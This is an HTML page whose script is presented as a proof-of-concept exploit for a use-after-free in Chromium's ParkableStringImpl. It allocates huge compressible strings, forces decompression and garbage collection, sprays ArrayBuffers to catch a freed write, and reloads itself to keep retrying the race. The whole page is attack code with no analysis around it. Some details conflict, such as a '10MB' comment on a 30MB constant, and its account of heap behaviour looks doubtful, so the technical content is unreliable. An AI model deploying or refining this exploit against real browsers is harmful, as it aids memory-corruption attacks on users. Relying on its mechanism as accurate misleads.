<!DOCTYPE html>
<html>
<head>
    <title>ParkableString UAF Trigger</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
        #status { font-size: 1.2em; font-weight: bold; }
    </style>
</head>
<body>
    <h2>Chromium Heap UAF - ParkableStringImpl</h2>
    <div id="status">[*] Preparing heap...</div>

    <script>
        function log(msg) {
            document.getElementById('status').innerText = msg;
            console.log(msg);
        }

        // Configuration
        const STRING_SIZE = 30 * 1024 * 1024; // 10MB strings to force Parking
        const NUM_STRINGS = 80; 
        let parkedStrings = [];
        let sprayBuffers = [];

        // 1. Allocate massive, highly compressible strings
        function allocateStrings() {
            log("[*] Allocating massive strings to force background compression...");
            for (let i = 0; i < NUM_STRINGS; i++) {
                // A repeating pattern is highly compressible, ensuring it gets Parked
                parkedStrings.push("A".repeat(STRING_SIZE) + i.toString());
            }
            
            // Give Chrome's background threads a moment to park the strings
            setTimeout(triggerRace, 3000);
        }

        // 2. The Kill Function: Read -> Free -> Reallocate
        function triggerRace() {
            log("[*] Triggering Decompress and racing Garbage Collector...");

            // Step A: Trigger a read on the strings. 
            // This forces Blink to call ParkableStringImpl::Decompress via base::PostTask
            let dummy = "";
            for (let i = 0; i < NUM_STRINGS; i++) {
                dummy = parkedStrings[i].substring(0, 10); 
            }

            // Step B: Instantly destroy all references to the strings
            parkedStrings = null;
            dummy = null;

            // Step C: Force Garbage Collection NOW.
            // If the timing is right, the Heap chunks are freed BEFORE the background thread writes to them.
            if (window.gc) {
                window.gc();
            } else {
                log("[!] window.gc() not available. Run Chrome with --js-flags=\"--expose-gc\"");
                // Fallback: Attempt to force GC via memory pressure
                for(let i=0; i < 100; i++) { new ArrayBuffer(1024 * 1024 * 50); }
            }

            // Step D: The Heap Spray
            // Rapidly allocate ArrayBuffers of the exact same size as the freed strings.
            // The Heap allocator will place these directly on top of the freed ParkableString memory.
            log("[*] Spraying ArrayBuffers to catch the UAF write...");
            for (let i = 0; i < NUM_STRINGS * 2; i++) {
                let buffer = new ArrayBuffer(STRING_SIZE);
                let view = new Uint32Array(buffer);
                view.fill(0xBBBBBBBB); // Fill with dummy data
                sprayBuffers.push(view);
            }

            log("[*] Race condition complete. Checking for crash...");
            setTimeout(verifyCorruption, 1000);
        }

        // 3. (Optional) Check if the background thread overwrote our ArrayBuffer
        function verifyCorruption() {
            let found = false;
            for (let i = 0; i < sprayBuffers.length; i++) {
                if (sprayBuffers[i][0] !== 0xBBBBBBBB) {
                    found = true;
                    break;
                }
            }

            if (found) {
                log("[+] MEMORY CORRUPTION DETECTED! UAF SUCCESSFUL.");
                document.body.style.backgroundColor = "#500";
                // STOP HERE - WE WON
            } else {
                log("[-] No hit. Retrying in 1 second...");
                // Clear buffers to prevent OOM crash of the whole tab
                sprayBuffers = []; 
                // Auto-refresh to keep the race going
                setTimeout(() => { window.location.reload(); }, 1000);
            }
        }

        // Start the exploit
        window.onload = allocateStrings;
    </script>
</body>
</html>
